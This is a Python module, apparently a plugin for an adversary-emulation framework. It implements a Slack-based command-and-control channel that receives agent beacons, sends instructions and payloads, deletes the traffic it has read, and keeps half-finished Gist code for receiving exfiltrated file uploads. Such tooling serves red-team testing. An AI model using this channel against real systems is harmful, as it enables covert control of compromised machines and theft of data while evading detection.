import aiohttp
import asyncio
import json
import os
import re
import time

from base64 import b64encode, b64decode
from collections import defaultdict

from app.utility.base_world import BaseWorld


def api_access(func):
    async def process(*args, **kwargs):
        async with aiohttp.ClientSession(headers=dict(Authorization='Bearer {}'.format(args[0].key)),
                                         connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            kwargs['session'] = session
            return await func(*args, **kwargs)
    return process


class Contact(BaseWorld):

    def __init__(self, services):
        self.name = 'slack'
        self.description = 'Use slack for C2'
        self.file_svc = services.get('file_svc')
        self.contact_svc = services.get('contact_svc')
        self.log = self.create_logger('contact_slack')
        self.key = ''
        self.channelid = ''
        self.botid = ''

        # TODO
        # Stores uploaded file chunks. Maps paw to dict that maps upload ID to GistUpload object
        self.pending_uploads = defaultdict(lambda: dict())

    def retrieve_config(self):
        return self.key

    async def start(self):
        if await self.valid_config():
            self.key = self.get_config('app.contact.slack')
            self.channelid = self.get_config('app.contact.slackchannelid')
            self.botid = self.get_config('app.contact.slackbotid')
            loop = asyncio.get_event_loop()
            loop.create_task(self.slack_operation_loop())

    async def slack_operation_loop(self):
        while True:
            await self.handle_beacons(await self.get_results())
            await self.handle_beacons(await self.get_beacons())
            # TODO
            # await self.handle_uploads(await self.get_uploads())
            await asyncio.sleep(15)

    async def valid_config(self):
        return re.compile(pattern='xoxb-[0-9]{13,13}-[0-9]{13,13}-[a-zA-Z0-9]{24,24}').match(self.get_config('app.contact.slack'))

    # TODO: THIS LATER
    async def handle_beacons(self, beacons):
        """
        Handles various beacons types (beacon and results)
        """
        for beacon in beacons:
            beacon['contact'] = beacon.get('contact', self.name)
            agent, instructions = await self.contact_svc.handle_heartbeat(**beacon)
            if 'results' not in beacon: 
                await self._send_payloads(agent, instructions)
                await self._send_instructions(agent, instructions)

    async def get_results(self):
        """
        Retrieve all SLACK posted results for a this C2's api key
        :return:
        """
        try:
            # Results are JSON dicts encoded in base64
            s = await self._get_slack_data(comm_type='results')
            # self.log.debug(s)
            encoded_json_blobs = [g[0] for g in s]
            return [json.loads(self.file_svc.decode_bytes(blob)) for blob in encoded_json_blobs]
        except Exception as e:
            self.log.error('Retrieving results over c2 (%s) failed: %s' % (self.__class__.__name__, e))
            return []

    async def get_beacons(self):
        """
        Retrieve all SLACK beacons for a particular api key
        :return: the beacons
        """
        try:
            # Beacons are JSON dicts encoded in base64
            s = await self._get_slack_data(comm_type='beacon')
            # self.log.debug(s)
            b64_encoded_json_blobs = [g[0] for g in s]
            return [json.loads(self.file_svc.decode_bytes(blob)) for blob in b64_encoded_json_blobs]
        except Exception as e:
            self.log.error('Retrieving beacons over c2 (%s) failed: %s' % (self.__class__.__name__, e))
            return []

    # TODO
    async def handle_uploads(self, upload_gist_info):
        for upload in upload_gist_info:
            file_contents = upload[0]
            metadata = upload[1].split(':')
            paw_info = upload[2].split('-')
            if len(paw_info) < 2 or len(metadata) < 5:
                self.log.error('Parsing GIST upload data failed. Paw information not provided.')
                return
            paw = paw_info[1]
            upload_id = metadata[1]
            filename = self.file_svc.decode_bytes(metadata[2])
            curr_chunk = int(metadata[3])
            num_chunks = int(metadata[4])
            self.log.debug('Received uploaded file chunk %d out of %d for paw %s, upload ID %s, filename %s ' % (
                curr_chunk, num_chunks, paw, upload_id, filename
            ))
            await self._store_file_chunk(paw, upload_id, filename, file_contents, curr_chunk, num_chunks)
            if await self._ready_to_export(paw, upload_id):
                self.log.debug('Upload %s complete for paw %s, filename %s' % (upload_id, paw, filename))
                await self._submit_uploaded_file(paw, upload_id)

    # TODO
    async def get_uploads(self):
        """
        Retrieve all GIST posted file uploads for this C2's api key
        :return: list of (raw content, gist description, gist filename) tuples for upload GISTs
        """
        try:
            upload_gists = await self._get_gist_data(comm_type='upload')
            return [(b64decode(g[0]), g[2], g[3]) for g in upload_gists]
        except Exception as e:
            self.log.error('Receiving file uploads over c2 (%s) failed: %s' % (self.__class__.__name__, e))
            return []

    """ PRIVATE """

    async def _send_instructions(self, agent, instructions):
        response = dict(paw=agent.paw,
                        sleep=await agent.calculate_sleep(),
                        watchdog=agent.watchdog,
                        instructions=json.dumps([json.dumps(i.display) for i in instructions]))
        if agent.pending_contact != agent.contact:
            response['new_contact'] = agent.pending_contact
            self.log.debug('Sending agent instructions to switch from C2 channel %s to %s' % (agent.contact, agent.pending_contact))
        await self._post_instructions(self._encode_string(json.dumps(response).encode('utf-8')), agent.paw)

    async def _post_instructions(self, text, paw):
        try:
            if await self._wait_for_paw(paw, comm_type='instructions'):
                return
            s = await self._post_slack_message(self._build_slack_message(comm_type='instructions', paw=paw,
                                                                 data=text))
            return s
            # return await self._post_gist(self._build_gist_content(comm_type='instructions', paw=paw,
            #                                                      files={str(uuid.uuid4()): dict(content=text)}))
        except Exception as e:
            self.log.warning('Posting instructions over c2 (%s) failed!: %s' % (self.__class__.__name__, e))

    async def _send_payloads(self, agent, instructions):
        for i in instructions:
            for p in i.payloads:
                filename, payload_contents = await self._get_payload_content(p, agent)
                await self._post_payloads(filename, payload_contents, '%s-%s' % (agent.paw, filename))

    async def _post_payloads(self, filename, payload_contents, paw):
        try:
            #files = {filename: dict(content=self._encode_string(payload_contents))}
            #self.log.debug(files)
            if await self._wait_for_paw(paw, comm_type='payloads'):
                return
            s =  await self._post_slack(self._build_slack_content(comm_type='payloads', paw=paw, files=self._encode_string(payload_contents)))
            return s
        except Exception as e:
            self.log.warning('Posting payload over c2 (%s) failed! %s' % (self.__class__.__name__, e))

    async def _store_file_chunk(self, paw, upload_id, filename, contents, curr_chunk, total_chunks):
        pending_upload = self.pending_uploads[paw].get(upload_id)
        if not pending_upload:
            # starting brand new upload
            pending_upload = self.GistUpload(upload_id, filename, total_chunks)
            self.pending_uploads[paw][upload_id] = pending_upload
        pending_upload.add_chunk(curr_chunk - 1, contents)

    async def _ready_to_export(self, paw, upload_id):
        pending_upload = self.pending_uploads[paw].get(upload_id)
        return pending_upload is not None and pending_upload.is_complete() and not pending_upload.exported

    async def _submit_uploaded_file(self, paw, upload_id):
        upload_info = self.pending_uploads[paw].get(upload_id)
        if upload_info is not None:
            created_dir = os.path.normpath('/' + paw).lstrip('/')
            saveto_dir = await self.file_svc.create_exfil_sub_directory(dir_name=created_dir)
            unique_filename = ''.join([upload_info.filename, '-', upload_id[0:10]])
            await self.file_svc.save_file(unique_filename, upload_info.export_contents(), saveto_dir)
            self.log.debug('Uploaded file %s/%s' % (saveto_dir, upload_info.filename))

    async def _get_raw_gist_info(self, comm_type):
        """
        Returns list of (gist url, gist ID, gist description, gist filename) tuples for gists matching the comm type.
        """
        return [(g['files'][file]['raw_url'], g['id'], g['description'], g['files'][file]['filename'])
                for g in await self._get_gists() for file in g.get('files')
                if comm_type in g['description']]

    async def _get_gist_content(self, urls):
        return [await self._fetch_content(url) for url in urls]

    async def _wait_for_paw(self, paw, comm_type):
        for message in await self._get_slack():
            if '{}-{}'.format(comm_type, paw) == message['text'].split(' | ')[0]:
                return True
        return False

    async def _get_slack_data(self, comm_type):
        data = await self._get_raw_slack_data(comm_type=comm_type)
        await self._delete_slack_messages(timestamps=[i["ts"] for i in data])
        return [i["text"].split(" | ")[1:] for i in data]

    async def _get_raw_slack_data(self, comm_type):
        return [message for message in await self._get_slack()
                if (("bot_id" in message and message["bot_id"] == self.botid) and
                comm_type in message["text"].split(' | ')[0])]

    @api_access
    async def _get_slack(self, session):
        s = json.loads(await self._fetch(session,
                                         'https://slack.com/api/conversations.history?channel={0}&oldest={1}'.format(self.channelid, int(time.time()-60))))
        # self.log.debug(s)
        return s["messages"]

    async def _get_gist_data(self, comm_type):
        """
        Returns list of (gist content, gist ID, gist description, gist filename) tuples for gists matching the comm
        type.
        """
        gists = await self._get_raw_gist_info(comm_type=comm_type)
        gist_data = [(await self._fetch_content(g[0]), g[1], g[2], g[3]) for g in gists]
        await self._delete_gists(gist_ids=[g[1] for g in gists])
        return gist_data

    async def _get_payload_content(self, payload, beacon):
        if payload in self.file_svc.special_payloads:
            f = await self.file_svc.special_payloads[payload](dict(file=payload, platform=beacon['platform']))
            return await self.file_svc.read_file(f)
        return await self.file_svc.read_file(payload)

    @staticmethod
    def _build_gist_content(comm_type, paw, files):
        return dict(description='{}-{}'.format(comm_type, paw), public=False, files=files)

    def _build_slack_content(self, comm_type, paw, files):
        s = dict(channels=self.channelid, initial_comment='{}-{}'.format(comm_type, paw), content=files)
        return s

    def _build_slack_message(self, comm_type, paw, data):
        s = dict(channel=self.channelid, text='{}-{} | {}'.format(comm_type, paw, data))
        return s

    def _build_slack_file(self, comm_type, paw, files):
        s = dict(channels=self.channelid, initial_comment='{}-{}'.format(comm_type, paw), file=files)
        return s

    @api_access
    async def _post_slack(self, message_content, session):
        return await self._post_form(session, 'https://slack.com/api/files.upload', body=message_content)

    @api_access
    async def _post_slack_message(self, message_content, session):
        return await self._post(session, 'https://slack.com/api/chat.postMessage', body=message_content)

    @api_access
    async def _post_gist(self, gist_content, session):
        return await self._post(session, 'https://api.github.com/gists', body=gist_content)

    @api_access
    async def _get_gists(self, session):
        return json.loads(await self._fetch(session, 'https://api.github.com/gists'))

    @api_access
    async def _delete_gists(self, gist_ids, session):
        for _id in gist_ids:
            await self._delete(session, 'https://api.github.com/gists/{}'.format(_id))

    @api_access
    async def _delete_slack_messages(self, timestamps, session):
        for _id in timestamps:
            await self._post_form(session, 'https://slack.com/api/chat.delete', dict(channel=self.channelid, ts=_id))

    @api_access
    async def _fetch_content(self, url, session):
        return await self._fetch(session, url)

    @staticmethod
    async def _delete(session, url):
        async with session.delete(url) as response:
            return await response.text('ISO-8859-1')

    @staticmethod
    async def _fetch(session, url):
        async with session.get(url) as response:
            return await response.text()

    @staticmethod
    async def _post(session, url, body):
        async with session.post(url, json=body) as response:
            return await response.text()

    @staticmethod
    async def _post_form(session, url, body):
        async with session.post(url, data=body) as response:
            return await response.text()

    @staticmethod
    def _encode_string(s):
        return str(b64encode(s), 'utf-8')
